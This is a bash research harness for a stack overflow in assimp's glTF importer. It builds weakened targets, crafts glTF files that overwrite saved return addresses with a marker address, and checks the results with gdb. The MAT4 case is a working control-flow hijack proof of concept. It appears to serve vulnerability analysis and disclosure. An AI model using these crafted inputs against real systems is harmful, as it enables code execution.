#!/usr/bin/env bash
# W25: a narrower (16-byte VEC4/FLOAT) index write does not relax W24's
# build conditions. Under the default -O0 stack protector the 16-byte window
# crosses the GetValue canary at dest+4 while both saved RIPs sit above it;
# without the protector the window reaches only the low half of the saved RIP
# at dest+12, whose high half belongs to the library return address.
# The 64-byte MAT4 case remains the positive control for a full-slot write.
# No new claim and no grade widening: these are preserved negatives.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
nsp=build-min-plain-o0-nsp
sp=build-min-plain-nf-o0
mkdir -p w25/evidence harness/bin
trace=w25/evidence/w25.trace
log=w25/evidence/w25.log
: >"$trace"
: >"$log"
pass=0
fail=0

check() { # name, required substring, rejected substring
    local name="$1" need="$2" reject="${3-}"
    if ! grep -qF -- "$need" "$trace"; then
        printf 'FAIL %s (missing %s)\n' "$name" "$need" | tee -a "$log"; fail=$((fail+1)); return
    fi
    if [ -n "$reject" ] && grep -qF -- "$reject" "$trace"; then
        printf 'FAIL %s (found %s)\n' "$name" "$reject" | tee -a "$log"; fail=$((fail+1)); return
    fi
    printf 'PASS %s\n' "$name" | tee -a "$log"; pass=$((pass+1))
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >w25/evidence/source-hashes.out
python3 - <<'PY' >>"$trace"
import hashlib
pins = {}
for line in open('PINS.sha256'):
    parts = line.split()
    if len(parts) == 2:
        pins[parts[1].lstrip('*')] = parts[0]
for path in ('code/AssetLib/glTF/glTFAsset.inl', 'code/AssetLib/glTF/glTFImporter.cpp'):
    h = hashlib.sha256(open('pins/assimp-6.0.6/' + path, 'rb').read()).hexdigest()
    print('PIN %s ok=%s' % (path.split('/')[-1], h == pins.get('assimp-6.0.6/' + path, h)))
PY
check pin-asset 'PIN glTFAsset.inl ok=True'
check pin-importer 'PIN glTFImporter.cpp ok=True'

common='-O0 -g -U_FORTIFY_SOURCE -DNDEBUG -fno-omit-frame-pointer'
build_lib() { # build dir, extra flags
    local bld="$1" extra="$2"
    if [ -f "$bld/bin/libassimp.so.6.0.6" ]; then return; fi
    cmake -G Ninja -S "$src" -B "$bld" -DCMAKE_BUILD_TYPE= \
        -DCMAKE_C_FLAGS="$common $extra" -DCMAKE_CXX_FLAGS="$common $extra" \
        -DASSIMP_BUILD_ALL_IMPORTERS_BY_DEFAULT=OFF \
        -DASSIMP_BUILD_GLTF_IMPORTER=ON \
        -DASSIMP_BUILD_ALL_EXPORTERS_BY_DEFAULT=OFF \
        -DASSIMP_BUILD_ASSIMP_TOOLS=OFF -DASSIMP_BUILD_TESTS=OFF \
        -DASSIMP_BUILD_SAMPLES=OFF -DASSIMP_BUILD_ZLIB=ON \
        -DASSIMP_WARNINGS_AS_ERRORS=OFF >/dev/null
    cmake --build "$bld" --parallel 2 --target assimp >/dev/null
}
build_lib "$nsp" -fno-stack-protector
build_lib "$sp" ''

build_driver() { # output, build dir, extra driver flags
    local out="$1" bld="$2" extra="${3-}"
    g++ $common -no-pie $extra -I "$src/include" -I "$bld/include" \
        harness/w24_driver.cpp -L "$bld/bin" -lassimp \
        -Wl,-rpath,"$PWD/$bld/bin" -o "harness/bin/$out" 2>/dev/null
}
build_driver w25_nsp "$nsp" -fno-stack-protector
build_driver w25_sp "$sp"

# Regenerate both crafted documents from the tracked base and the fresh
# marker addresses of the two -no-pie drivers; no address is hard-coded.
marker_nsp=$(harness/bin/w25_nsp harness/cases/safe.gltf | sed -n 's/^MARKER_ADDR=//p')
marker_sp=$(harness/bin/w25_sp harness/cases/safe.gltf | sed -n 's/^MARKER_ADDR=//p')
python3 - "$marker_nsp" "$marker_sp" <<'PY'
import base64, json, struct, sys
nsp, sp = (int(x, 16) for x in sys.argv[1:3])
base = json.load(open('harness/cases/mat4idx-count1.gltf'))
head, data = base['buffers']['buf']['uri'].split(',', 1)
raw = bytearray(base64.b64decode(data))
def write_case(path, marker, size, full):
    buf = bytearray(raw[:36 + size])
    if full:  # 64-byte MAT4: both saved-RIP slots at write offsets 12 and 44
        buf[36 + 12:36 + 20] = struct.pack('<Q', marker)
        buf[36 + 44:36 + 52] = struct.pack('<Q', marker)
    else:     # 16-byte VEC4: only the low half of the +12 slot is writable
        buf[36 + 12:36 + 16] = struct.pack('<I', marker & 0xffffffff)
    doc = json.loads(json.dumps(base))
    doc['buffers']['buf']['byteLength'] = len(buf)
    doc['buffers']['buf']['uri'] = head + ',' + base64.b64encode(bytes(buf)).decode()
    doc['bufferViews']['vidx']['byteLength'] = size
    doc['accessors']['idx']['type'] = 'MAT4' if full else 'VEC4'
    open(path, 'w').write(json.dumps(doc, indent=2) + '\n')
write_case('w25/evidence/nsp-vec4.gltf', nsp, 16, False)
write_case('w25/evidence/sp-vec4.gltf', sp, 16, False)
write_case('w25/evidence/nsp-mat4.gltf', nsp, 64, True)
print('MARKERS nsp=%s sp=%s' % (sys.argv[1], sys.argv[2]))
PY

run_case() { # driver, case path, label
    local drv="$1" casefile="$2" label="$3" rc=0 out="w25/evidence/$3.out"
    harness/bin/"$drv" "$casefile" >"$out" 2>&1 || rc=$?
    printf 'CASE %s rc=%s marker=%s scene=%s\n' "$label" "$rc" \
        "$(grep -qF TAUF_MARKER_CALLED "$out" && echo 1 || echo 0)" \
        "$(sed -n 's/^case=.* scene=\([a-z]*\).*/\1/p' "$out")" >>"$trace"
}

run_case w25_nsp harness/cases/safe.gltf nsp-safe
run_case w25_sp w25/evidence/sp-vec4.gltf sp-vec4
run_case w25_nsp w25/evidence/nsp-vec4.gltf nsp-vec4
run_case w25_nsp w25/evidence/nsp-mat4.gltf nsp-mat4

check nsp-safe 'CASE nsp-safe rc=0 marker=0 scene=ok'
check sp-canary 'CASE sp-vec4 rc=134 marker=0'
check nsp-lowhalf 'CASE nsp-vec4 rc=139 marker=0'
check nsp-fullslot 'CASE nsp-mat4 rc=0 marker=1'

frame() { # driver, case path, label
    gdb -q -batch -x harness/w25_frame.gdb \
        --args "harness/bin/$1" "$2" >"w25/evidence/$3-frame.out" 2>&1 || true
    python3 - "$3" <<'PY' >>"$trace"
import sys
label = sys.argv[1]
text = open('w25/evidence/%s-frame.out' % label).read()
lines = text.splitlines()
hit = [l for l in lines if l.startswith('W25_HIT ')]
length = hit[0].split('len=')[1].split()[0] if hit else '-'
canary = next((l.split()[1] for l in lines if l.startswith('W25_CANARY ')), '-')
canary_slots = [] if canary == '-' else [int(x) for x in canary.split(',')]
rips = []
for l in lines:
    if l.startswith('W25_RIP '):
        parts = dict(x.split('=') for x in l.split()[1:])
        rips.append((int(parts['frame']), int(parts['delta']), int(parts['val'], 16)))
inwrite = [d for _, d, _ in rips if 0 <= d < int(length)] if hit else []
above = [d for _, d, _ in rips if d > 0]
rip1 = [v for f, _, v in rips if f == 1]
print('FRAME %s hit=%s len=%s canary_inwrite=%s rips_inwrite=%s nearest_above=%s rip1_hi=%s' %
      (label, len(hit), length,
       (','.join(str(x) for x in canary_slots if 0 <= x < int(length)) if hit else '-') or '-',
       ','.join(map(str, inwrite)) or '-', min(above) if above else '-',
       hex(rip1[0] >> 32) if rip1 else '-'))
PY
}
frame w25_sp w25/evidence/sp-vec4.gltf sp-vec4
frame w25_nsp w25/evidence/nsp-vec4.gltf nsp-vec4

check frame-sp 'FRAME sp-vec4 hit=1 len=16 canary_inwrite=4 rips_inwrite=- nearest_above=20'
check frame-nsp 'FRAME nsp-vec4 hit=1 len=16 canary_inwrite=- rips_inwrite=12 nearest_above=12 rip1_hi=0x7fff'

printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" | tee -a "$log"
printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" >>"$trace"
sha256sum w25/evidence/*.out | tee -a "$log"
